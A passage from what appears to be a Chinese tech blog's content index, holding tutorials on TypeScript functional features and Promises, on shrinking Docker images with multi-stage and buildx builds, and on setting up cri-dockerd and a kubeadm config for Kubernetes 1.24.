golang 一样。Typescript 天生支持函数式编程。\nlambda 表达式，在 JS/TS 中叫 箭头函数：let comp = (a: number, b:number) =\u0026gt; a-b 注意使用 箭头函数 和使用 function 的区别 变量的类型可以是函数 let comp = (a: number, b:number) =\u0026gt; { return a-b } // or let comp = (a: number, b:number) =\u0026gt; a-b 等同于：\nlet comp = function (a: number, b:number): number { return a-b } 值 (literal) 可以是函数 a.sort((a: number, b:number) =\u0026gt; a-b) 或者，加大括号就要像函数体中一样，需要明确的 return：\na.sort((a: number, b:number) =\u0026gt; { ... return a-b }) 对象的字段可以是函数 如 为对象定义方法。\n函数的参数可以是函数 let a = [3,4,1,2,44,5,78,32,12,1,1,2] a.sort((a: number, b:number) =\u0026gt; { return a-b }) console.log(a) // [1, 1, 1, 2, 2, 3, 4, 5, 12, 32, 44, 78] 等同于：\nfunction comp(a: number, b:number): number { return a-b } a.sort(comp) 再或者，使用 forEach遍历数组：\nconst a = [1,2,3,4,5,6,7,8,9] const b: number[] = [] a.forEach((v) =\u0026gt; { b.push(v*v) }) 函数的返回值可以是函数 function createComp() { return (a: number, b: number) =\u0026gt; a-b } a.sort(createComp()) 参数和返回值同时是函数，这里有点类似于 Gin 框架的串联中间件，例如在转发请求之前记录日志：\nfunction createComp() { return (a: number, b: number) =\u0026gt; a-b } function logComp(comp: (a: number, b: number) =\u0026gt; number) { return (a: number, b: number) =\u0026gt; { console.log(\u0026#39;comp\u0026#39;,a,b) return comp(a, b) } } a.sort(c(logComp())) 函数的闭包 核心思想是：控制变量的可见范围，避免不期望的操作。\n部分应用函数 在参数数量不匹配时，把函数用起来，就使用 函数闭包，实现部分应用函数：\nconst GoodFactor = 2 const a = [1,2,3,4,5,6,7,8,9] // 接收两个参数 返回 boolean function isGoodNumber(goodFactor: number, v: number) { return v % goodFactor === 0 } // 接收两个参数 第二个参数是个函数，该函数只有一个参数 function filterArray(a: number[], f: (v: number) =\u0026gt; boolean) { return a.filter(f) } // 那么如何使用 filterArray，把 isGoodNumber 作为第二个参数传入呢？ // 利用 函数闭包，给构造一个合法的函数 // (v) =\u0026gt; isGoodNumber(GoodFactor, v) 等同于 (v) =\u0026gt; isGoodNumber(GoodFactor, v) =\u0026gt; boolean 也就相当于 (v) =\u0026gt; boolean filterArray(a, (v) =\u0026gt; isGoodNumber(GoodFactor, v)) 等同于：\nfunction isGoodNumber(goodFactor: number, v: number) { return v % goodFactor === 0 } function filterArray(a: number[], f: (v: number) =\u0026gt; boolean) { return a.filter(f) } const GoodFactor = 2 const a = [1,2,3,4,5,6,7,8,9] // 利用这个函数 把双参数的 isGoodNumber 封装成单参数 function partialApply(f: (a: number, b: number)=\u0026gt;boolean, gn: number) { return (v: number) =\u0026gt; { return f(gn, v) } } filterArray(a, partialApply(isGoodNumber, GoodFactor)) Promise Promise 对应的是前端应用的异步运行机制，为解决程序异步运行而创建出的特性。\n创建、使用、串联 Promise 和错误捕获 首先，看一个使用回调函数的例子：\nfunction add( a:number, b:number, callback: (res: number) =\u0026gt; void): void { // 模拟网络请求的延迟 setTimeout(()=\u0026gt;{ callback(a+b) }, 2000) } add(2,3, res =\u0026gt; { console.log(\u0026#39;2+3\u0026#39;, res) add(res, 4, res2 =\u0026gt; { console.log(\u0026#34;2+3+4\u0026#34;, res2) }) }) 这是一个使用 嵌套的回调函数 的例子。模拟网络请求的延迟，嵌套累加遍历。这种写法看起来：\n比较难懂 当嵌套层数比较深的时候，不容易理解 下面把它改成 Promise 形式：\nPromise 比回调函数更容易理解 有更简单的使用和处理方式 通过 .then 串联，解决繁杂的回调嵌套 通过 reslove ，reject 返回成功或失败的情况 通过 catch 捕获错误 function add( a:number, b:number): Promise\u0026lt;number\u0026gt; { return new Promise((reslove, reject) =\u0026gt; { if (b%17===0) { // 定义处理失败情况 reject(`bad number: ${b}`) } setTimeout(()=\u0026gt;{ // 处理成功 返回 reslove reslove(a+b) }, 2000) }) } // 通过 .then 调用 好理解 同时易于串联处理 add(2,3).then(res=\u0026gt;{ console.log(\u0026#39;2+3\u0026#39;, res) return add(res, 17) }).then(res=\u0026gt;{ console.log(\u0026#39;2+3+4\u0026#39;, res) }).catch(err=\u0026gt;{\t// 通过 catch 捕获 reject 的情况 console.log(\u0026#39;caught error\u0026#39;, err) }) Promise 的定义如下：\nvar Promise: PromiseConstructor new \u0026lt;number\u0026gt;(executor: (resolve: (value: number | PromiseLike\u0026lt;number\u0026gt;) =\u0026gt; void, reject: (reason?: any) =\u0026gt; void) =\u0026gt; void) =\u0026gt; Promise\u0026lt;number\u0026gt; Promise 处理成功，以 resolve 返回，如果失败则以 reject 返回。\n等待 Promise 运行 所有 Promise 都运行完成再进行下一步 function add( a:number, b:number): Promise\u0026lt;number\u0026gt; { return new Promise((reslove, reject) =\u0026gt; { if (b%17===0) { reject(`bad number: ${b}`) } setTimeout(()=\u0026gt;{ reslove(a+b) }, 2000) }) } const p = Promise.all([add(2,3), add(4,5)]).then(res=\u0026gt;{ console.log(res[0]*res[1]) }) 通过 Promise.all()，可以等待参数中的 Promise 都运行完成再进行下一步操作，Promise.all() 会根据不同的参数形成签名，在这个例子中，的签名是：\nPromiseConstructor.all\u0026lt;[Promise\u0026lt;number\u0026gt;, Promise\u0026lt;number\u0026gt;]\u0026gt;(values: [Promise\u0026lt;number\u0026gt;, Promise\u0026lt;number\u0026gt;]): Promise\u0026lt;[number, number]\u0026gt; 它接收了 Promise\u0026lt;number\u0026gt;类型的数组，并返回 number 类型的数组。\n等待多个 Promise 中的一个完成就继续 const r = Promise.race([add(2,3), add(4,5)]).then(res=\u0026gt;{ console.log(res) }) 使用 Promise.race() 实现这个能力。当然它的返回结果只有一个。本示例中，它的函数签名如下：\nPromiseConstructor.race\u0026lt;[Promise\u0026lt;number\u0026gt;, Promise\u0026lt;number\u0026gt;]\u0026gt;(values: [Promise\u0026lt;number\u0026gt;, Promise\u0026lt;number\u0026gt;]): Promise\u0026lt;number\u0026gt; async/await 异步函数 async 和 await 算是 TS 中的一个语法糖，它们的使用可以很好的融入 Promise 语法，实现函数的异步运行：\nfunction add( a:number, b:number): Promise\u0026lt;number\u0026gt; { return new Promise((reslove, reject) =\u0026gt; { if (b%17===0) { reject(`bad number: ${b}`) } setTimeout(()=\u0026gt;{ reslove(a+b) }, 2000) }) } // 在声明函数之前 添加 async 关键字 // 用于异步执行 async function calc() { // await 不能在全局范围中使用 只能在局部中/函数中使用 // 用于等待函数执行结果 const a = await add(2,3) console.log(\u0026#39;2+3\u0026#39;, a) const b = await add(4,5) return b } calc().then(res =\u0026gt; { console.log(res) }) 其中，函数 calc() 的声明如下：\nfunction calc(): Promise\u0026lt;number\u0026gt; 它的返回值类型是一个 Promise\u0026lt;number\u0026gt; 。通过 async 和 await ，可以方便的使用 Promise 函数。\nfunction add( a:number, b:number): Promise\u0026lt;number\u0026gt; { return new Promise((reslove, reject) =\u0026gt; { if (b%17===0) { reject(`bad number: ${b}`) } setTimeout(()=\u0026gt;{ reslove(a+b) }, 2000) }) } function mul(a: number, b:number): Promise\u0026lt;number\u0026gt; { return new Promise((reslove, reject) =\u0026gt; { reslove(a*b) }) } async function calc() { // 同样的 使用 try-catch 捕获错误 try { // 在这里依然可以使用 Promise.all() 因为它返回的仍然是 Promise const [a,b] = await Promise.all([add(2,3), add(4,5)]) return await mul(a,b) } catch (err) { console.log(\u0026#39;catch err\u0026#39;, err) return undefined } } calc().then(res =\u0026gt; { console.log(res) }) 接口 TS 将接口看为“一种对象形式的规定”，与其他语言不同，它不要求你“实现”一个接口，而是你定义的数据结构“要符合接口的规定”。接口描述一个类型应该有的字段。\nreadonly 表示只读字段 ? 用于标识可选字段 interface Employee { readonly name: string\t// readonly 只读字段 salary: number bonus?: number\t// ? 可选 } const e1: Employee = { name: \u0026#39;jack\u0026#39;, salary: 10000, } const e2: Employee = { name: \u0026#39;jack\u0026#39;, salary: 10000, bonus: 3000 } 接口里面可以定义方法吗？\n当然可以。但是 TS 中的接口大多都只用于定义字段，它的设计并不适用于定义方法。\n可选字段串联和非空断言 使用 ? 标识可选字段，以及在使用时告诉编译器该字段可能没有； 在使用变量时，利用 ! 进行可选字段的非空断言，让编译器认为该可选字段一定有值，忽略空的情况。 通过代码，这个特性还是比较好理解的：\ninterface Employee { name?: { first?: string last: string } salary: number bonus?: number updateBonus(p: number): void } function hasAAA(e: Employee) { return e.name?.first?.startsWith(\u0026#39;AAA\u0026#39;) } 对于接口中定义的对象类型，也可以使用 ? 标识其可选性。在使用时，通过 field?. 让编译器自动处理字段空/非空的情况，本示例中，hasAAA 的函数签名为：\nfunction hasAAA(e: Employee): boolean | undefined 如果，我们想告诉编译器，保证可选字段一定有值，那么就 使用 !，这样一来，如果出问题，例如实际上可选字段没有赋值，那么出现后果需要自己处理，编译器不会帮我们处理可选字段为空的情况：\nfunction hasAAA(e: Employee) { return e.name!.first!.startsWith(\u0026#39;AAA\u0026#39;) } 接口的扩展 接口之间可以相互扩展，使用 extends 关键字：\ninterface Employee extends HasName { salary: number bonus?: number updateBonus(p: number): void } interface HasName { name?: { first?: string last: string } } function hasAAA(e: Employee) { return e.name?.first?.startsWith(\u0026#39;AAA\u0026#39;) } 类型的并、断言以及判断 类型的并 和 [Union of Types](#Union of Types) 一样，变量类型可以是多种接口的组合。在使用变量时，只能够 . 出来这些接口公有的字段。\ninterface Button { visible: boolean enabled: boolean onClick(): void } interface Image { visible: boolean src: string } function processElement(e: Button | Image) { // 只能 . 出来 visible 字段 e.visible } 使用 as 进行类型断言 上面代码中，如果我们像判断这个变量具体是符合哪一个接口的定义，就需要通过 as 关键字去实现类型断言，告诉编译器它是某个类型。\nfunction processElement(e: Button | Image) { if ((e as any).onClick) { const btn = e as Button btn.onClick } else { const img = e as Image console.log(img.src) } } 通过 as 关键字，告诉编译器变量的类型。\n此外，还有一种语法也可以实现，即 is：\nfunction isButton(e: Button | Image): e is Button { return (e as any).onClick !== undefined } function processElement(e: Button | Image) { if (isButton(e)) { e.onClick } else { console.log(e.src) } } 这两种方式本质上都是通过 (e as any).onClick 来判断是否有某个接口的属性，来实现接口断言。\n类 TS 中的类与接口不同，类中的元素必须有初始化的值，通常有两种方式进行初始化\n直接使用 bonus: number = 0 为元素赋初始值。 使用 constructor 构造函数为元素赋值。同时，在 constructor 中使用 public 或 private ，关键字，可以自动省略显式定义类的元素，相当于定义了相关字段。 使用 ? 可选字段值不需要初始化 默认字段都是 public // 写法1 class Employee { name: string salary: number private bonus?: number // 可选字段 不需要初始化 other?: string constructor(name: string, salary: number) { this.name = name this.salary = salary } } // 写法2 class Employee { private bonus?: number // 使用 public 和 private 后不需要声明 // name: string // salary: number constructor(public name: string, private salary: number) { this.name = name this.salary = salary } } 对于 private 对象，可以定义 set和 get 方法：\nclass Employee { private bonus?: number constructor(public name: string, private salary: number) { this.name = name this.salary = salary } set setBonus(n: number) { this.bonus = n } // 如果直接返回 return this.bonus 这个函数签名就是 Employee.getBonus: number | undefined // 这里为了避免 undefined 的情况 在 bonus 不存在的情况下返回了 0 // 此时函数签名为 Employee.getBonus: number get getBonus() { return this.bonus || 0 } } const e = new Employee(\u0026#39;jack\u0026#39;, 8000) // 这里的调用就像赋值一样 e.setBonus = 10000 console.log(e) 类也可以继承：\n使用 super() 为其所继承的类赋值，注意这些函数签名的对应字段中不能有 public 和private class Employee { private bonus?: number constructor(public name: string, public salary: number) { this.name = name this.salary = salary } set setBonus(n: number) { this.bonus = n } get getBonus() { return this.bonus || 0 } } const e = new Employee(\u0026#39;jack\u0026#39;, 8000) e.setBonus = 10000 console.log(e) class Manager extends Employee { private reporters: Employee[] = [] // 这里的 name salary 前面不能有 public private // 因为是使用 super 赋值给所继承的类的值 constructor (name: string, salary: number, public com: string) { super(name, salary) this.com = com } addReporter(e: Employee) { this.reporters.push(e) } } 用类实现接口 推荐由接口的使用者去实现接口，使用接口的隐式实现 类如何实现接口？有两种方式：\n通过显式的 implements 实现。\n通过在类中，定义接口所拥有的所有变量，来隐式的实现。\ninterface Employee { name: string salary: number } // 或者省略 implements 关键字 class EmployeeImp implements Employee { private bonus?: number constructor(public name: string, public salary: number) { this.name = name this.salary = salary } } const e: Employee = new EmployeeImp(\u0026#39;jack\u0026#39;, 8000) 泛型 泛型的定义是比较抽象的，它用来约束参数类型。例如：\nconst a: Array\u0026lt;number\u0026gt; = [] const p: Promise\u0026lt;number\u0026gt; = new Promise((reslove, reject)=\u0026gt;{ ... }) 下面是自己定义泛型的一个示例：\nclass MyArray\u0026lt;T\u0026gt; { data: T[] = [] add(t: T) { this.data.push(t) } map\u0026lt;U\u0026gt;(f: (v: T) =\u0026gt; U): U[] { return this.data.map(f) } print() { console.log(this.data) } } const a = new MyArray\u0026lt;number\u0026gt;() a.add(1) a.add(2) // 编译器能够知道 此时 map 的类型是 MyArray\u0026lt;number\u0026gt;.map\u0026lt;string\u0026gt;(f: (v: number) =\u0026gt; string): string[] console.log(a.map(v=\u0026gt;v.toString())) a.print() 用接口约束泛型的参数 interface HasWeight { weight: number } // 通过 extends 让泛型的类型中必须含有 HasWeight 接口中的字段 class MyArray\u0026lt;T extends HasWeight\u0026gt; { data: T[] = [] add(t: T) { this.data.push(t) } map\u0026lt;U\u0026gt;(f: (v: T) =\u0026gt; U): U[] { return this.data.map(f) } print() { console.log(this.data) } sortByWeight() { this.data.sort((a,b)=\u0026gt;a.weight-b.weight) } } class WeightedNum { constructor(public weight: number) { this.weight = weight } } const a = new MyArray\u0026lt;WeightedNum\u0026gt;() a.add(new WeightedNum(32)) a.add(new WeightedNum(11)) a.sortByWeight() console.log(a) ","date":"2023-01-13T21:24:49+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/image-20230115155449572.png","permalink":"https://lizonglingo.github.io/p/typescript%E4%B8%A4%E5%A4%A9%E9%80%9F%E6%88%90/","title":"TypeScript两天速成"},{"content":"多阶段构建和跨平台镜像 多阶段构建 我们都知道，容器的镜像是一种分层结构，这种结构可以让我们在构建容器镜像时，通过一些方法可以缩小镜像的体积。\n体积庞大的困扰 # docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE spring-boot latest c706f273de79 About a minute ago 284MB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 97bd21dc4f53 2 minutes ago 596MB eclipse-temurin 17-jre-jammy 5e2265f6166a 5 weeks ago 266MB eclipse-temurin 17-jdk-jammy 9ef86393bfda 5 weeks ago 455MB quay.io/cilium/cilium \u0026lt;none\u0026gt; c34c54b31628 2 months ago 451MB quay.io/metallb/speaker v0.13.7 738c5d221d60 2 months ago 106MB registry.k8s.io/pause 3.9 e6f181688397 3 months ago 744kB quay.io/cilium/cilium \u0026lt;none\u0026gt; 743cf6b60787 4 months ago 456MB dyrnq/ingress-nginx-controller v1.3.1 b7c8e5e285c0 4 months ago 263MB quay.io/cilium/cilium \u0026lt;none\u0026gt; 68413ce8a529 5 months ago 457MB influxdb 2.3.0 b24266999a5d 6 months ago 445MB 从上面看出，有许多镜像体积有将近半个GB之多。有时我们使用不同的基础镜像，构建出来的体积也大有不同。镜像过大往往带来：\n上传或拉取镜像速度慢，减慢发布更新流程 占用很多存储空间 等问题。一些情况下，我们可以通过多阶段构建，来缩减容器镜像的体积。\n大白话说，多阶段构建就是：\n先使用一个大的基础镜像，这个基础镜像里面有将源码编译成可执行文件的所有工具和依赖，利用这个大镜像把源码构建成可执行文件； 再换一个小的基础镜像（它或许没有很多构建源码所需的依赖，但是它足以运行这个可执行文件），把这个应用的可执行文件放到这个小的基础镜像里，在小基础镜像中运行应用。 虽然不够准确，但是多阶段构建容器镜像的思想就是如此，来看两个例子。\nJava应用多阶段构建 将应用构建过程和启动过程分为两个阶段 FROM eclipse-temurin:17-jdk-jammy as builder WORKDIR /opt/app COPY .mvn/ .mvn COPY mvnw pom.xml ./ RUN ./mvnw dependency:go-offline COPY ./src ./src RUN ./mvnw clean install FROM eclipse-temurin:17-jre-jammy WORKDIR /opt/app EXPOSE 8080 # 从 构建应用使用的镜像 eclipse-temurin:17-jdk-jammy 中 # 复制可执行文件到 eclipse-temurin:17-jre-jammy COPY --from=builder /opt/app/target/*.jar /opt/app/*.jar 将应用构建延迟到启动时 FROM eclipse-temurin:17-jdk-jammy WORKDIR /app COPY .mvn/ .mvn COPY mvnw pom.xml ./ RUN ./mvnw dependency:resolve COPY src ./src CMD [\u0026#34;./mvnw\u0026#34;, \u0026#34;spring-boot:run\u0026#34;] 我们来看下，两种方式构建的容器镜像的大小：\n# docker image ls | grep spring spring-boot-big latest a24cbb0ff94d 4 minutes ago 525MB spring-boot latest c706f273de79 20 minutes ago 284MB 很明显，第2种将应用构建延迟到启动时的容器镜像体积几乎是第一种方式的2倍。\n但是，对于应用程序的运行来说，显然用于编译代码、构建可执行程序的JDK等工具是不需要的。\nGolang应用多阶段构建 # 第一阶段 # 非通用的 多用于编译 golang 的镜像 golang:1.16-alpine FROM golang:1.16-alpine AS builder RUN go env -w GO111MODULE=on RUN go env -w GOPROXY=https://goproxy.cn,direct COPY . /go/src/server WORKDIR /go/src/server RUN go install ./server/... # 第二阶段 FROM alpine:3.13 COPY --from=builder /go/bin/server /bin/server ENV ADDR=:9090 ENV WS_ADDR=:8080 EXPOSE 9090 EXPOSE 8080 # 设置服务入口 ENTRYPOINT [ \u0026#34;/bin/server\u0026#34; ] 我们看这两个阶段使用的基础镜像：\n$ docker image ls | grep alpine alpine latest 042a816809aa 3 days ago 7.05MB $ docker image ls | grep golang golang 1.19-alpine feb4bbda921c 2 days ago 354MB 二者的体积相差有50倍之多。而在生产环境中，运行一个golang程序，可能使用体积7M左右的alpine就够了，而在构建过程，还是需要完整的300多M的golang镜像去构建。一些编译型语言往往需要一些工具链去实现源码的编译，但是这些工具在生产环境中会过多占用不必要的空间。通过多阶段构建，刚好解决了这个问题。\n补充：构建镜像时，尽量复用 docker 构建缓存。\n跨平台构建容器镜像 Golang的跨平台编译可以做到在单一平台构建不同架构下的可执行文件。对于容器来说，也有这种功能。Docker提供了buildx，来实现这个能力。我们看看如何使用。\n为 docker 配置 buildx 创建一个 builder 构建器。 $ docker buildx create --name builder builder 告诉 docker 使用这个构建器。然后初始化并启动 buildkit 容器。 $ docker buildx use builder $ docker buildx inspect --bootstrap [+] Building 106.0s (1/1) FINISHED =\u0026gt; [internal] booting buildkit 106.0s =\u0026gt; =\u0026gt; pulling image moby/buildkit:buildx-stable-1 103.7s =\u0026gt; =\u0026gt; creating container buildx_buildkit_builder0 2.3s Name: builder Driver: docker-container Nodes: Name: builder0 Endpoint: unix:///var/run/docker.sock Status: running Buildkit: v0.11.0 # 这里看到 支持以下平台 Platforms: linux/amd64, linux/amd64/v2, linux/amd64/v3, linux/386 使用 buildx 构建多平台镜像 # BUILDPLATFORM TARGETOS TARGETARCH # 平台 如 Linux/amd64 系统 如 Linux 架构 如 amd64 # 这些是内置变量 # --platform=$BUILDPLATFORM 强制使用不同平台的基础镜像 默认本平台基础架构对应的镜像 FROM --platform=$BUILDPLATFORM golang:1.18 as build # 声明 系统和平台 ARG TARGETOS TARGETARCH WORKDIR /opt/app COPY go.* ./ RUN go mod download COPY . . # 将 上述信息告知 golang 的编译工具 RUN --mount=type=cache,target=/root/.cache/go-build \\ GOOS=$TARGETOS GOARCH=$TARGETARCH go build -o /opt/app/example . FROM ubuntu:latest WORKDIR /opt/app COPY --from=build /opt/app/example ./example CMD [\u0026#34;/opt/app/example\u0026#34;] 通过这个 Dockerfile，执行命令：\n$ docker buildx build --platform linux/amd64,linux/arm64 -t demo:latest . docker就会构建linux/amd64和linux/arm64两个架构下的镜像了。\n本部分简单给出构建多平台镜像的思路，具体细节请看相关文档：\nhttps://github.com/docker/buildx\n补充 如何选择基础镜像 先看一个情况：\n# Step 1: build golang binary FROM golang:1.17 as builder WORKDIR /opt/app COPY . . RUN go build -o example # Step 2: copy binary from step1 FROM alpine WORKDIR /opt/app COPY --from=builder /opt/app/example ./example CMD [\u0026#34;/opt/app/example\u0026#34;] 如果go程序中我们使用了 CGO，或是包含 C 的底层代码。那么启动这个镜像时容器会报错。\n原因在于：默认情况下，golang 编译成的可执行文件不是真正的 ”静态“，一些 C 语言的库会在执行之前动态链接。而 alpine 这个基础镜像中，没有 C 语言的 glibc 标准库，这个标准库正是 golang:1.17 编译时使用的。\n如果我们在编译时让其禁用 CGO，在 Dockerfile 中使用：RUN CGO_ENABLED=0 go build -o example，go 的编译工具就会实现真正的”静态“，将链接编译好的 C 相关的代码打包到可执行程序中。这样一来，使用 alpine 作为第二阶段的镜像也可以正常运行程序了。\n因此，不同阶段的基础镜像如何选择，还是需要根据具体的场景，再尽可能的缩小镜像体积。从易用性、安全性、跨平台等多方面综合考虑。\n","date":"2023-01-13T18:18:33+08:00","image":"https://lizonglingo.github.io/post-images/image-20230113160652452.png","permalink":"https://lizonglingo.github.io/p/%E6%9E%84%E5%BB%BA%E5%BA%94%E7%94%A8%E6%97%B6%E5%A6%82%E4%BD%95%E7%BC%A9%E5%B0%8F%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E7%9A%84%E4%BD%93%E7%A7%AF/","title":"构建应用时如何缩小容器镜像的体积"},{"content":" 为体验Kubernetes以及Cilium组合在一起产生的新特性，我计划将Kubernetes升级到1.24+，并使用最新的稳定版cilium1.12来作集群网络。\n我所看重的最大改变：\nkubernetes1.24+正式移除dockershim，关于“kubernetes弃用Docker”这一话题也算是尘埃落定，kubernetes正式拥抱纯净的CRI。 cilium1.12后正式支持kubernetes1.24.0，并且其重大的新特性cilium service mesh引起了我的兴趣，“multi control plan”、“sidercar/sidercar-free”等亮点让我很想尝试，是不是基于eBPF的service mesh在性能开销、指标粒度上能够给云上可观测性带来更好的体验。 所以，第一个问题来了，移除dockershim后，我们怎样继续使用docker engine作为底层的容器管理以及运行时管理者呢？\nDockershim和容器运行时 我们知道，提供服务的终点是Pod中运行的容器，kubernetes本身并不提供这种能力，而是依赖CRI去接入其他容器运行时，实现这样的能力的。我们最直接的体会就是kubernetes可以按照声明文件自动拉取、运行容器，其实这都是容器运行时的工作。例如docker，它就有这样的能力，并且在k8s发展初期，Docker甚至比k8s更有知名度，同时Docker比k8s CRI这样概念要早，docker engine也就没有实现CRI接口这一说，所以k8s使用dockershim作为支撑docker这一容器运行时的过渡。因此在k8s早期版本，就针对docker这个容器运行时做了适配。\n每个节点上的kubelet在dockershim的能力下，可以与节点上的docker engine进行交互，去使用docker的能力。\n从上图中可以看出，dockershim的作用与一个CRI实现是一样的。尽管目前docker底层也是使用了containerd，但是我们还需要多一个中间环节，用docker调用containerd。\n而k8s中CRI之一containerd则为k8s提供了直接调用containerd的能力。\n目前主要的CRI实现有：\ncontainerd cri-o cri-dockerd 正因如此，k8s不必局限于docker这一种运行时，CRI的能力可以让k8s使用特性不同的容器运行时。\n弃用dockershim后，Docker还有用吗？ 当然。\n在我的印象里，docker仍然是目前使用最多的容器打包构建、镜像管理和运行工具。docker hub有丰富镜像资源、有很多开发者在使用docker去构建自己应用镜像。使用docker build打包的镜像依然符合CRI的标准（因为已经容器运行时以及有标准化组织OCI为其制定规范了）。\n只不过，原来为docker engine做适配工作现在已经不属于k8s社区的管辖范围，需要其他社区自己去按照CRI的标准，为docker engine编写接入k8s的“转接头”。因此，就有了cri-dockerd。\n如果我们想继续使用在k8s中使用docker，就必须使用cri-dockerd作为适配器，它让我们可以通过CRI来使用docker engine。\n在新版本集群中使用cri-dockerd 之前的博客中我们分享到，搭建集群只需要节点上有docker engine就可以，然后按照kubeadm，kubelet，kubectl就可以了，不会去刻意、显式的配置容器运行时。那是因为k8s内置的dockershim自动帮我们完成了这个工作。\n在1.24.0之后，我们在创建集群之前，也要像安装CNI那样先配置我们的容器运行时，才可以正常初始化k8s集群。\n安装并配置cri-dockerd ⚠️这需要节点上有正常运行的docker engine。同时要在所有节点上安装cri-dockerd。\n我们这里使用Ubuntu22.04作为环境，直接在release下载构建好的对应Ubuntu版本的.deb安装文件。\n然后，进行安装：\n\u0026gt; dpkg -i cri-dockerd_0.2.3.3-0.ubuntu-jammy_amd64.deb Selecting previously unselected package cri-dockerd. (Reading database ... 212454 files and directories currently installed.) Preparing to unpack cri-dockerd_0.2.3.3-0.ubuntu-jammy_amd64.deb ... Unpacking cri-dockerd (0.2.3~3-0~ubuntu-jammy) ... Setting up cri-dockerd (0.2.3~3-0~ubuntu-jammy) ... Created symlink /etc/systemd/system/multi-user.target.wants/cri-docker.service → /lib/systemd/system/cri-docker.service. Created symlink /etc/systemd/system/sockets.target.wants/cri-docker.socket → /lib/systemd/system/cri-docker.socket. 安装log里有两个很重要的信息点：\nCreated symlink /etc/systemd/system/multi-user.target.wants/cri-docker.service → /lib/systemd/system/cri-docker.service.\nCreated symlink /etc/systemd/system/sockets.target.wants/cri-docker.socket → /lib/systemd/system/cri-docker.socket.\nsysmlink是Linux中的一种文件类型，称为“符号链接”、“软链接”，指向计算机上另一个文件或者文件夹。类似于Windows中的快捷方式。这种链接文件记录了被链接文件的路径，更方便的访问某些文件。\n在安装cri-dockerd时，为cri-docker.service，和cri-docker.socket创建了软链接。\n安装后，我们执行cri-dockerd -h 了解一下基本信息：\n\u0026gt; cri-dockerd -h CRI that connects to the Docker Daemon Usage: cri-dockerd [flags] Flags: --buildinfo Prints the build information about cri-dockerd --cni-bin-dir string \u0026lt;Warning: Alpha feature\u0026gt; A comma-separated list of full paths of directories in which to search for CNI plugin binaries. (default \u0026#34;/opt/cni/bin\u0026#34;) --cni-cache-dir string \u0026lt;Warning: Alpha feature\u0026gt; The full path of the directory in which CNI should store cache files. (default \u0026#34;/var/lib/cni/cache\u0026#34;) --cni-conf-dir string \u0026lt;Warning: Alpha feature\u0026gt; The full path of the directory in which to search for CNI config files (default \u0026#34;/etc/cni/net.d\u0026#34;) --container-runtime-endpoint string The endpoint of backend runtime service. Currently unix socket and tcp endpoints are supported on Linux, while npipe and tcp endpoints are supported on windows. Examples:\u0026#39;unix:///var/run/cri-dockerd.sock\u0026#39;, \u0026#39;npipe:////./pipe/cri-dockerd\u0026#39; (default \u0026#34;unix:///var/run/cri-dockerd.sock\u0026#34;) --cri-dockerd-root-directory string Path to the cri-dockerd root directory. (default \u0026#34;/var/lib/cri-dockerd\u0026#34;) --docker-endpoint string Use this for the docker endpoint to communicate with. (default \u0026#34;unix:///var/run/docker.sock\u0026#34;) --hairpin-mode HairpinMode \u0026lt;Warning: Alpha feature\u0026gt; The mode of hairpin to use. (default none) -h, --help Help for cri-dockerd --image-pull-progress-deadline duration If no pulling progress is made before this deadline, the image pulling will be cancelled. (default 1m0s) --ipv6-dual-stack Enable IPv6 dual stack support --log-level string The log level for cri-docker (default \u0026#34;info\u0026#34;) --network-plugin string \u0026lt;Warning: Alpha feature\u0026gt; The name of the network plugin to be invoked for various events in kubelet/pod lifecycle. --network-plugin-mtu int32 \u0026lt;Warning: Alpha feature\u0026gt; The MTU to be passed to the network plugin, to override the default. Set to 0 to use the default 1460 MTU. --pod-cidr string The CIDR to use for pod IP addresses, only used in standalone mode. In cluster mode, this is obtained from the master. For IPv6, the maximum number of IP\u0026#39;s allocated is 65536 --pod-infra-container-image string The image whose network/ipc namespaces containers in each pod will use (default \u0026#34;k8s.gcr.io/pause:3.6\u0026#34;) --runtime-cgroups string Optional absolute name of cgroups to create and run the runtime in. --version Prints the version of cri-dockerd 从“CRI that connects to the Docker Daemon”中看到，cri-dockerd的作用是连接节点上的docker daemon的，然后k8s再连接cri-dockerd，就能使用docker作为容器运行时了。\n--cni-bin-dir string --cni-cache-dir string --cni-conf-dir string 上面三个参数是关于容器网络的，暂时在alpha阶段。\n--container-runtime-endpoint 这个参数需要我们注意，它指定了k8s需要连接CRI端点，默认是unix:///var/run/cri-dockerd.sock，在后面配置kubeadm config时需要用到。\n--docker-endpoint string 这个参数就是cri-dockerd要去连接的docker daemon的端点，来使用docker的能力。\n--pod-cidr string 该参数只有在单节点部署时才会用到，在集群环境下cri-dockerd通过获取master node的信息知晓pod的cidr划分。\n--pod-infra-container-image 该参数可以用来设置Pod中的pause容器的镜像版本，默认使用k8s.gcr.io/pause:3.6这个镜像。但是在k8s1.24中，应该使用3.7版本，并且要换成aliyun镜像，在后面需要设置。\n修改kubeadm config文件 我先导出kubeadm默认的启动配置文件。\nkubeadm config print init-defaults \u0026gt; kubeadm1.24.conf\n然后做一些修改，我的修改如下：\napiVersion: kubeadm.k8s.io/v1beta3 bootstrapTokens: - groups: - system:bootstrappers:kubeadm:default-node-token token: abcdef.0123456789abcdef ttl: 24h0m0s usages: - signing - authentication kind: InitConfiguration localAPIEndpoint: advertiseAddress: 192.168.153.21 bindPort: 6443 nodeRegistration: criSocket: unix:///var/run/cri-dockerd.sock imagePullPolicy: IfNotPresent name: nm taints: null --- apiServer: timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta3 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controllerManager: {} dns: {} etcd: local: dataDir: /var/lib/etcd imageRepository: registry.aliyuncs.com/google_containers kind: ClusterConfiguration kubernetesVersion: 1.24.0 networking: dnsDomain: cluster.local serviceSubnet: 10.96.0.0/12 podSubnet: 10.5.0.0/16 scheduler: {} 需要注意的几个点有：\nadvertiseAddress: 192.168.153.21：设置控制平面API Server的地址和端口。 criSocket: unix:///var/run/cri-dockerd.sock：这需要特别注意，criSocket就是上面我们说的cri-dockerd中的--container-runtime-endpoint参数，如果使用了别的容器运行时这里也要相应修改。 name: nm：本机的hostname。 imageRepository: registry.aliyuncs.com/google_containers：国内用aliyun的镜像。 podSubnet: 10.5.0.0/16：Pod cidr信息。 启动集群(启动失败) 然后我们尝试启动集群：\n# kubeadm init --config ../create-cluster/kubeadm1.24.conf [init] Using Kubernetes version: 